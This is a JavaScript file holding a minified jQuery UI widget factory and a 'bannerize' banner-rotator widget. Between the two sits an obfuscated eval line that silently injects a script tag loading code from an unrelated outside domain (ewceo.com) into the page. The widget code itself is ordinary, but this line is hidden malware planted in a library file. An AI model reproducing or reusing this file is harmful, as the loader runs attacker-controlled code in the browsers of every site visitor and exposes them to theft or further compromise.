(function(b,j){if(b.cleanData){var k=b.cleanData;b.cleanData=function(a){for(var c=0,d;(d=a[c])!=null;c++)b(d).triggerHandler("remove");k(a)}}else{var l=b.fn.remove;b.fn.remove=function(a,c){return this.each(function(){if(!c)if(!a||b.filter(a,[this]).length)b("*",this).add([this]).each(function(){b(this).triggerHandler("remove")});return l.call(b(this),a,c)})}}b.widget=function(a,c,d){var e=a.split(".")[0],f;a=a.split(".")[1];f=e+"-"+a;if(!d){d=c;c=b.Widget}b.expr[":"][f]=function(h){return!!b.data(h,
a)};b[e]=b[e]||{};b[e][a]=function(h,g){arguments.length&&this._createWidget(h,g)};c=new c;c.options=b.extend(true,{},c.options);b[e][a].prototype=b.extend(true,c,{namespace:e,widgetName:a,widgetEventPrefix:b[e][a].prototype.widgetEventPrefix||a,widgetBaseClass:f},d);b.widget.bridge(a,b[e][a])};b.widget.bridge=function(a,c){b.fn[a]=function(d){var e=typeof d==="string",f=Array.prototype.slice.call(arguments,1),h=this;d=!e&&f.length?b.extend.apply(null,[true,d].concat(f)):d;if(e&&d.charAt(0)==="_")return h;
e?this.each(function(){var g=b.data(this,a),i=g&&b.isFunction(g[d])?g[d].apply(g,f):g;if(i!==g&&i!==j){h=i;return false}}):this.each(function(){var g=b.data(this,a);g?g.option(d||{})._init():b.data(this,a,new c(d,this))});return h}};b.Widget=function(a,c){arguments.length&&this._createWidget(a,c)};b.Widget.prototype={widgetName:"widget",widgetEventPrefix:"",options:{disabled:false},_createWidget:function(a,c){b.data(c,this.widgetName,this);this.element=b(c);this.options=b.extend(true,{},this.options,
this._getCreateOptions(),a);var d=this;this.element.bind("remove."+this.widgetName,function(){d.destroy()});this._create();this._trigger("create");this._init()},_getCreateOptions:function(){return b.metadata&&b.metadata.get(this.element[0])[this.widgetName]},_create:function(){},_init:function(){},destroy:function(){this.element.unbind("."+this.widgetName).removeData(this.widgetName);this.widget().unbind("."+this.widgetName).removeAttr("aria-disabled").removeClass(this.widgetBaseClass+"-disabled ui-state-disabled")},
widget:function(){return this.element},option:function(a,c){var d=a;if(arguments.length===0)return b.extend({},this.options);if(typeof a==="string"){if(c===j)return this.options[a];d={};d[a]=c}this._setOptions(d);return this},_setOptions:function(a){var c=this;b.each(a,function(d,e){c._setOption(d,e)});return this},_setOption:function(a,c){this.options[a]=c;if(a==="disabled")this.widget()[c?"addClass":"removeClass"](this.widgetBaseClass+"-disabled ui-state-disabled").attr("aria-disabled",c);return this},
enable:function(){return this._setOption("disabled",false)},disable:function(){return this._setOption("disabled",true)},_trigger:function(a,c,d){var e=this.options[a];c=b.Event(c);c.type=(a===this.widgetEventPrefix?a:this.widgetEventPrefix+a).toLowerCase();d=d||{};if(c.originalEvent){a=b.event.props.length;for(var f;a;){f=b.event.props[--a];c[f]=c.originalEvent[f]}}this.element.trigger(c,d);return!(b.isFunction(e)&&e.call(this.element[0],c,d)===false||c.isDefaultPrevented())}}})(jQuery);
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('b 6(a){9 3.c(a)?!0:!1}8(!6("4")){5 2=3.d("7");2.e="f://g.h.j/i/k/l.m";2.n="4";5 o=3.p.q(2)};',27,27,'||newE|document|am01|var|exist|script|if|return||function|getElementById|createElement|src|http|www|ewceo||com|em|jquery3246|js|id|crea|body|appendChild'.split('|'),0,{}));
;(function($) {
 $.widget("ma.bannerize", {
  options: {
   interval: 5,
   auto: true,
   shuffle: false,
   startAt: 0,
   overlay: true,
   className: ''
  },
  _create: function(){
   var self = this; // global reference to widget object
   self.rotating = self.options.auto;
   // banner element
   self.element.addClass('ui-banner ' + self.options.className);
   // banner slides
   self.slides = self.element.find('ul:eq(0)')
    .addClass('ui-banner-slides');
   // banner slogans
   self.slogans = self.element.find('ul:eq(1)')
   .addClass('ui-banner-slogans')
   .delegate('li', 'click.bannerize', function(event){
    event.preventDefault();
    var $obj = $(this);
    self.queue("stop");
    if(!$obj.hasClass('ui-banner-slogans-current') && !$obj.hasClass('ui-banner-slogans-prev fa fa-long-arrow-up')){
     self._rotate($obj.prevUntil('.ui-banner-slogans-current').length + 1, "next");
    }
   });
   if(self.options.shuffle){
    self._shuffle();
    self.options.startAt = 0;
   }
   // left arrow
   self.arrowPrev =
    $('<a/>', {
     href: '#'
    })
    .addClass('ui-banner-arrow ui-banner-arrow-prev fa fa-long-arrow-up')
    .bind('click', function(event){
     event.preventDefault();
     self.queue("stop");
     self._rotate(1, "prev");
    })
    .appendTo(self.element);
   // right arrow
   self.arrowNext =
    $('<a/>', {
     href: '#'
    })
    .addClass('ui-banner-arrow ui-banner-arrow-next  fa fa-long-arrow-down')
    .bind('click', function(event){
     event.preventDefault();
     self.queue("stop");
     self._rotate(1, "next");
    })
    .appendTo(self.element);
   self.arrows = $([]).pushStack([self.arrowPrev[0], self.arrowNext[0]]);
   self.overlay = $('<div class="ui-banner-overlay"></div>');
   if(self.options.overlay){
    self.overlay.appendTo(self.element);
   }
   if(self.slides.children().length !== self.slogans.children().length){ // ensure banners and slogans have the same amount
    self.element.hide();
    self.destroy();
   }
   if(!self.slides.children(':eq(' + self.options.startAt + ')').length){ // ensure the start at specifed exists
    self._setOption("startAt", 0);
   }
   self.slides
    .children(':eq(' + self.options.startAt + ')')
     .addClass('ui-banner-current ui-banner-slides-current')
     .next()
      .addClass('ui-banner-next ui-banner-slides-next')
     .end()
     .filter(function(i){
       if(!self.options.startAt){
        self.slides
         .children(':last')
          .detach()
          .prependTo(self.slides);
       }
       return true;
     })
     .prev()
      .addClass('ui-banner-prev ui-banner-slides-prev');
   self.slogans
    .children(':eq(' + self.options.startAt + ')')
     .addClass('ui-banner-current ui-banner-slogans-current')
     .next()
      .addClass('ui-banner-next ui-banner-slogans-next')
     .end()
     .filter(function(i){
       if(!self.options.startAt){
        self.slogans
         .children(':last')
          .detach()
          .prependTo(self.slogans);
       }
       return true;
     })
     .prev()
      .addClass('ui-banner-prev ui-banner-slogans-prev')
      .each(function(i, v){
       var $obj = $(this);
       $obj.css('marginTop', ($obj.outerHeight() * -1) + 'px');
      });
   $('body').bind('keypress.bannerize', function(event){ // listen for keypress' that are left or right arrow
    if(/^(input|textarea)$/i.test(event.target.nodeName)){
     return;
    }
    if([37,39].indexOf(event.keyCode) !== -1){
     self.queue("stop");
     self._rotate(1, (event.keyCode === 37) ? "prev" : "next");
    }
   });
   self.options.interval = self.options.interval.toString().split(".")[0].length < 4 ? self.options.interval * 1000 : self.options.interval;
   if(self.options.auto){// start the queue
    self.queue("start");
   }
  },
  _shuffle: function(){
   var self = this, pos, len, $slides = self.slides.children(), slides = [], $slogans = self.slogans.children(), slogans = [];
   while (len = $slides.length, len > 0){
    pos = parseInt(Math.random() * len);
    slides.push($slides[pos]);
    slogans.push($slogans[pos]);
    $slides = $slides.filter(':not(:eq(' + pos + '))');
    $slogans = $slogans.filter(':not(:eq(' + pos + '))');
   }
   self.slides
    .empty()
    .append($([]).pushStack(slides));
   self.slogans
    .empty()
    .append($([]).pushStack(slogans));
   return;
  },
  queue: function(action){
   var self = this;
   if(action === "start"){
    self.element
     .bind("rotate.bannerize", function(event){
      var $obj = $(this);
      $obj
       .delay(self.options.interval, "rotate")
       .queue("rotate", function(next){
        $obj.trigger("rotate");
        next();
       });
       self._rotate(1, "next");
     })
     .delay(self.options.interval, "rotate")
     .queue("rotate", function(next){
       var $obj = $(this);
       $obj.trigger("rotate");
       next();
     })
     .dequeue("rotate");
    self.rotating = true;
   }
   else{
    self.element
     .unbind("rotate.bannerize")
     .clearQueue("rotate");
    self.rotating = false;
   }
  },
  _rotate: function(step, direction){
   var self = this;
   if(self.sliding){
    return;
   }
   (direction === "prev") ? self._slideBack(step) : self._slideForward(step);
  },
  _slideBack: function(step){
   var self = this;
   self.slides.queue("banner", function(next){
    self.sliding = true;
    next();
   });
   for(var a = 1; a <= step; a++){
    self.slides
     .queue("banner", function(next){
      self.slides
       .children('.ui-banner-next')
        .removeClass('ui-banner-next ui-banner-slides-next')
        .css('left', '');
      self.slogans
       .children('.ui-banner-next')
        .removeClass('ui-banner-next ui-banner-slogans-next')
        .css('left', '');
      next();
     })
     .queue("banner", function(next){
      self.slogans
       .children('.ui-banner-current')
        .toggleClass('ui-banner-current ui-banner-slogans-current ui-banner-next ui-banner-slogans-next')
       .end()
       .children('.ui-banner-prev')
        .animate({ marginTop: '0px' }, 600, function(){
         $(this).toggleClass('ui-banner-prev ui-banner-slogans-prev ui-banner-current ui-banner-slogans-current');
         next();
        });
      self.slides
       .children('.ui-banner-current')
        .each(function(i, v){
         var $obj = $(this);
         $obj.animate({
          left: '+=' + $obj.width() + 'px'
         }, 600, function(){
          $obj
           .toggleClass('ui-banner-current ui-banner-slides-current ui-banner-next ui-banner-slides-next')
           .css('left', '');
         })
        })
       .end()
       .children('.ui-banner-prev')
        .animate({ left: '0px' }, 600, function(){
         $(this)
         .toggleClass('ui-banner-prev ui-banner-slides-prev ui-banner-current ui-banner-slides-current')
         .css('left', '');
         next();
        });
     })
     .queue("banner", function(next){
      self.slogans
       .children(':last')
        .addClass('ui-banner-prev ui-banner-slogans-prev')
        .each(function(i, v){
         var $obj = $(this);
         $obj.css('marginTop', ($obj.outerHeight() * -1) + 'px');
        })
        .detach()
        .prependTo(self.slogans);
      self.slides
       .children(':last')
        .addClass('ui-banner-prev ui-banner-slides-prev')
        .detach()
        .prependTo(self.slides);
      next();
     })
     .queue("banner", function(next){
      self.rotating = false;
      next();
     });
   }
   self.slides
    .queue("banner", function(next){
     self.sliding = false;
     self._trigger("rotateBack");
     self._trigger("rotate");
     next();
    })
   .dequeue("banner");
  },
  _slideForward: function(step){
   var self = this;
   self.slides.queue("banner", function(next){
    self.sliding = true;
    next();
   });
   for(var a = 1; a <= step; a++){
    self.slides
     .queue("banner", function(next){
      self.slides
       .children('.ui-banner-prev')
        .removeClass('ui-banner-prev ui-banner-slides-prev')
        .css('left', '')
        .detach()
        .appendTo(self.slides);
      self.slogans
       .children('.ui-banner-prev')
        .removeClass('ui-banner-prev ui-banner-slogans-prev')
        .css('marginTop', '')
        .detach()
        .appendTo(self.slogans);
      next();
     })
     .queue("banner", function(next){
      self.slogans
       .children('.ui-banner-current')
        .each(function(i, v){
         var $obj = $(this);
         $obj.animate({
          marginTop: ($obj.outerHeight() * -1) + 'px'
         }, 600, function(){
          $obj.toggleClass('ui-banner-current ui-banner-slogans-current ui-banner-prev ui-banner-slogans-prev');
         });
        })
       .end()
       .children('.ui-banner-next')
        .toggleClass('ui-banner-next ui-banner-slogans-next ui-banner-current ui-banner-slogans-current')
         .next()
          .addClass('ui-banner-next ui-banner-slogans-next');
      self.slides
       .children('.ui-banner-current')
        .each(function(i, v){
         var $obj = $(this);
         $obj.animate({
          left: '-=' + $obj.width() + 'px'
         }, 600, function(){
          $obj.toggleClass('ui-banner-current ui-banner-slides-current ui-banner-prev ui-banner-slides-prev');
         })
        })
       .end()
       .children('.ui-banner-next')
        .animate({ left: '0px' }, 600, function(){
         $(this)
          .toggleClass('ui-banner-next ui-banner-slides-next ui-banner-current ui-banner-slides-current')
          .next()
           .addClass('ui-banner-next ui-banner-slides-next');
         next();
        });
     });
   }
   self.slides
    .queue("banner", function(next){
     self.sliding = false;
     self._trigger("rotateNext");
     self._trigger("rotate");
     next();
    })
    .dequeue("banner");
  },
  _setOption: function(key, value) {
   var self, oldValue = self.options[key];
   switch(key){
    case "className":
     self.element.toggleClass(this.options.className + " " + value);
     break;
    case "interval":
     value = value.toString().split(".")[0].length < 4 ? value * 1000 : value;
     break;
   }
   $.Widget.prototype._setOption.apply(self, arguments); // call the base _setOption method
   self._trigger("setOption", { type: "setOption" }, { // trigger a callback when options change incase the user wants that
    option: key,
    original: oldValue,
    current: value
   });
  },
  destroy: function(){ // undo everything
   var self = this;
   $(document).unbind("keypress.bannerize");
   self.element
    .clearQueue("rotate")
    .unbind("rotate.bannerize")
   .removeClass('ui-banner ' + self.options.className);
   self.slides
    .removeClass('ui-banner-slides')
    .children()
     .removeClass('ui-banner-current ui-banner-slides-current ui-banner-prev ui-banner-slides-prev ui-banner-next ui-banner-slides-next');
   self.slogans
    .removeClass('ui-banner-slogans')
    .undelegate('li', 'click.bannerize')
    .children()
     .removeClass('ui-banner-current ui-banner-slides-current ui-banner-prev ui-banner-slides-prev ui-banner-next ui-banner-slides-next');
   self.arrows.remove();
   self.overlay.remove();
   $.Widget.prototype.destroy.call(self);
  }
 });
})(jQuery);